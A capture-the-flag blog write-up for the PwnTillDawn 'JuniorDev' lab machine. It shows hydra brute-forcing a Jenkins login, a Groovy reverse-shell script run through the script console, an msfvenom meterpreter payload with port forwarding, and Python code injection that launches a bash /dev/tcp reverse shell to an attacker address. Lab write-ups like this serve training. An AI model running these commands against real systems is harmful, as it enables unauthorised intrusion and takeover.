---
title: JuniorDev Writeup PwnTillDawn
author: r0b0tG4nG
date: 2021-11-27 11:33:00 +0800
categories: [Blogging, PwnTillDawn]
tags: [writeups, jenkins, portfwd, python]
math: true
mermaid: true
image:
  src: https://imgur.com/Yfejewk
  width: 800
  height: 500
---

![info](https://imgur.com/Yfejewk)

**> Information Gathering**<br>
Started with the usual nmap scan and from the scan we can see active ports. port 22 (ssh) & port 30609 (jetty 9.4.27).<br>
![nmap](https://imgur.com/xj9yFz2)

<br>
Upon visiting the web service running on port _30609_, i found a login screen.<br>

![web](https://imgur.com/klt9dCX)


Since we dont have any credentials, the best option is to *bruteforce* the target web login. Below is the hydra command used<br>
`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.150.150.38 -s 30609 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"`<br>
![hydra](https://imgur.com/klt9dCX)<br>

Hydra yield positive results. We have found the password for the admin user. The next step is to login on jetty webapp running on port 30609. *username == admin* & *password == matrix*<br>
![login](https://imgur.com/OSvL3Nt)<br>
     

The credentials worked we are logged in now.<br>
![logged in](https://imgur.com/uCw0l30)<br>

After a short googling on how to abuse jenkins script console to rce we found a good post from <a href="https://github.com/gquere/pwn_jenkins">gquere</a>. With this information, we were able to build a script to test remote code execution on the target. <br>
![test-rce](https://imgur.com/6WADwED)<br>


Now  that we can execute commands on the target, its time to spawn a reverse shell. Below is the script I used.
```shell
String host="10.66.67.114";  
int port=9001;  
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
<br>
![reverse-shell](https://imgur.com/jIE48Vg)<br>


**> Post Exploitation**<br>
After i got a shell, post enumeration phase begins. I transfered linpeas to the target, changer permissions and executed linpeas. In linpeas output, i found a port binded to the _loopback address(127.0.0.1:8080)_.<br>
![lo address](https://imgur.com/pGmvFM4)<br> 

Port 8080 is mostly used for web services. To confirm, i tried `wget` on the ort since `curl` is not found on the target.<br>
![lo address](https://imgur.com/0hk2eI3)<br>

Reading the fetched `index.html` from port 8080 indicates that there is a web webapp running internally.<br>
![contents index](https://imgur.com/t2gkbU0)<br>

To access this internal web service, we have to port-forward port 8080 from the target to our attacking machine. To do this, i created a linux payload using `msfvenom`. <br>
``msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.66.66.78 LPORT=9002 -f elf -o 9002msf``<br>
![msfvenom](https://imgur.com/ucnPApI)<br>

The next thing to do is to transfer the payload to the target and execute it while msfconsole is listerning fortrt incoming connections.<br>
![payload transfer](https://imgur.com/N10E0gV)<br>

When the payload is executed on the target, we should recieve a connection back on `msfconsole`. Once the connection is in, we can port-forward the target intertnal port `8080` to our attacking machine using the `portfwd`command in msfconsole<br>
`portfwd add -l 8080 -p 8080 -r 127.0.0.1`<br>
![msfshell portfwd](https://imgur.com/hZfURL1)<br>

Now that we the target port `8080` connected back to our attacking machine, wehn visited, we found a python maths console.<br>
![internal web](https://imgur.com/fqWLB5U)<br>

Since it's a simple python maths calculator, we can easily bypasss the pythin functions and gain a remote code execution. To do this, we will use `__import__("os").system("")`<br>

We created a bash file with contains our bash reverse liner. a simple bash script, transfered the bash file to the target. 
```shell
#!/bin/bash
bash -c  'bash -i&/dev/tcp/10.66.66.78/9002 0>&1'
```
<br>

Once our bash file is on the target, we can execute the bash file using the pythin calculator. We simply do this using the command
`__import__("os").system("/bin/bash /tmp/shell.sh")`<br>
![root-shell](https://imgur.com/3MnjYsn)